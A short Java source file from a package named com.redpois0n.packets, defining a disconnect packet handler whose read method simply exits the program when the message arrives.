package com.redpois0n.packets;

public class PacketDISCONNECT extends Packet {

	@Override
	public void read(String line) throws Exception {
		System.exit(0);
	}

}
